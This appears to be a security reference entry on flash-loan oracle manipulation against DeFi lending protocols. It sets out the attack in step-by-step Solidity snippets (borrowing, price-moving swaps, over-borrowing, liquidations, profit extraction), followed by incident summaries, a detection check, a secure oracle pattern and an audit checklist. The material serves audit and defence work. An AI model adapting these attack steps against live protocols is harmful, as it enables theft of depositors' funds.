---
id: ATTACK-CHAIN-FLASH-ORACLE
title: Flash Loan Oracle Manipulation Attack Chain
category: attack-chains
difficulty: advanced
tags: [flash-loan, oracle, price-manipulation, liquidation]
real_exploits: [cream-2021, harvest-2020, value-defi-2020]
typical_loss: $50M-200M
last_updated: 2026-01-31
---

# Flash Loan Oracle Manipulation Attack Chain

## Overview

This attack chain uses borrowed capital to manipulate price oracles, then exploits the manipulated prices to extract value through lending, trading, or liquidation mechanisms.

## Attack Flow Diagram

```
┌─────────────┐     ┌──────────────┐     ┌────────────────┐     ┌───────────────┐
│ Flash Loan  │ ──▶ │ Manipulate   │ ──▶ │ Exploit at     │ ──▶ │ Repay + Profit│
│ Borrow $50M │     │ Oracle Price │     │ Wrong Price    │     │ Extract $10M  │
└─────────────┘     └──────────────┘     └────────────────┘     └───────────────┘
```

## Prerequisites

- **Target uses spot price oracles** (AMM reserves, single-block reads)
- **Sufficient DEX liquidity** to move price significantly
- **Lending/trading protocol trusts the oracle**
- **Flash loan availability** (Aave, dYdX, Uniswap, etc.)

## Attack Steps

### Step 1: Flash Loan - Acquire Capital

```solidity
// Borrow massive capital with no upfront collateral
function initiateAttack() external {
    // Borrow $50M USDC from Aave
    ILendingPool(aave).flashLoan(
        address(this),
        usdc,
        50_000_000e6,
        abi.encode(AttackParams(...))
    );
}
```

**State Change**: Attacker temporarily controls $50M

### Step 2: Manipulate Oracle Price

```solidity
function executeOperation(...) external {
    // Use borrowed capital to move AMM price
    
    // Sell $50M USDC for TOKEN
    // This crashes USDC price relative to TOKEN
    // Or: Buy $50M of TOKEN, pumping its price
    
    IUniswapRouter(router).swapExactTokensForTokens(
        50_000_000e6,
        0,  // Accept any amount
        [USDC, TOKEN],
        address(this),
        block.timestamp
    );
    
    // Oracle now reflects manipulated price
    // TOKEN price is artificially HIGH
    // USDC price is artificially LOW
}
```

**State Change**: Oracle reports inflated/deflated prices

### Step 3: Exploit Manipulated Price

**Option A: Over-borrow**
```solidity
// Deposit TOKEN as collateral at inflated value
ILendingProtocol(target).deposit(TOKEN, tokenBalance);

// Borrow maximum against inflated collateral
uint256 maxBorrow = ILendingProtocol(target).getMaxBorrow(address(this));
ILendingProtocol(target).borrow(USDC, maxBorrow);

// Borrowed more than collateral is actually worth!
```

**Option B: Trigger Liquidations**
```solidity
// Other users' positions now appear underwater
// Liquidate them at favorable terms
address[] memory underwater = findLiquidatable();

for (uint i = 0; i < underwater.length; i++) {
    ILendingProtocol(target).liquidate(
        underwater[i],
        repayAmount,
        collateralAsset
    );
    // Receive collateral at discount
}
```

**Option C: Trade at Wrong Price**
```solidity
// If target has internal swap using bad oracle
ITarget(target).swap(TOKEN, USDC, amount);
// Receives USDC at inflated TOKEN price
```

**State Change**: Attacker extracts excess value

### Step 4: Restore Price & Repay

```solidity
// Swap back to restore prices (optional, gets arbitraged anyway)
IUniswapRouter(router).swapExactTokensForTokens(
    tokenBalance,
    0,
    [TOKEN, USDC],
    address(this),
    block.timestamp
);

// Repay flash loan + fee
IERC20(usdc).transfer(aave, 50_000_000e6 + fee);

// Keep the profit
uint256 profit = IERC20(usdc).balanceOf(address(this));
IERC20(usdc).transfer(attacker, profit);
```

**Final State**: Attacker profits, protocol loses

## Real-World Examples

### Cream Finance (October 2021) - $130M

```
1. Flash borrowed $500M in DAI/USDC
2. Manipulated yUSD price upward
3. Deposited yUSD as collateral at inflated value  
4. Borrowed massive amounts against inflated collateral
5. Repaid flash loan, kept profit
```

### Harvest Finance (October 2020) - $34M

```
1. Flash loaned USDC
2. Swapped to USDT, moving Curve pool price
3. Deposited into Harvest at inflated rate
4. Swapped back, crashed price
5. Withdrew at new (unfavorable to pool) rate
6. Repeated 17 times in one transaction
```

## Detection Points

| Step | Detection Signal | Monitoring |
|------|-----------------|------------|
| 1 | Large flash loan | Track flash loan events |
| 2 | Massive AMM swap | Price deviation alerts |
| 3 | Unusual borrow/liquidation | Health factor anomalies |
| 4 | Repayment + profit | Profit extraction patterns |

```solidity
// Detection: Price deviation check
function detectManipulation(address token) public view returns (bool) {
    uint256 spotPrice = getAMMPrice(token);
    uint256 twapPrice = getTWAPPrice(token, 30 minutes);
    
    uint256 deviation = spotPrice > twapPrice 
        ? (spotPrice - twapPrice) * 100 / twapPrice
        : (twapPrice - spotPrice) * 100 / twapPrice;
    
    return deviation > 5;  // >5% deviation = suspicious
}
```

## Prevention Measures

### At Each Step

| Step | Prevention |
|------|------------|
| Flash Loan | Can't prevent, but can detect |
| Price Manipulation | Use TWAP, Chainlink, multiple sources |
| Exploitation | Check price validity before critical operations |
| Extraction | Rate limiting, time delays |

### Secure Oracle Pattern

```solidity
contract SecureLending {
    uint256 constant MAX_PRICE_DEVIATION = 5;  // 5%
    
    function getSecurePrice(address token) public view returns (uint256) {
        uint256 spotPrice = getSpotPrice(token);
        uint256 chainlinkPrice = getChainlinkPrice(token);
        uint256 twapPrice = getTWAP(token, 30 minutes);
        
        // Require all sources agree within tolerance
        require(
            isWithinDeviation(spotPrice, chainlinkPrice, MAX_PRICE_DEVIATION),
            "Price mismatch: spot vs chainlink"
        );
        require(
            isWithinDeviation(spotPrice, twapPrice, MAX_PRICE_DEVIATION),
            "Price mismatch: spot vs TWAP"
        );
        
        // Use median of three
        return median(spotPrice, chainlinkPrice, twapPrice);
    }
    
    function borrow(address token, uint256 amount) external {
        uint256 price = getSecurePrice(token);
        // Continue with secure price...
    }
}
```

## Audit Checklist

```
[ ] What oracle does the protocol use?
[ ] Can oracle be manipulated within one block?
[ ] Are TWAP periods sufficient (>10 minutes)?
[ ] Does protocol cross-check price sources?
[ ] Are there circuit breakers for price deviations?
[ ] Can flash loans access the vulnerable function?
[ ] Are there time delays on critical operations?
```
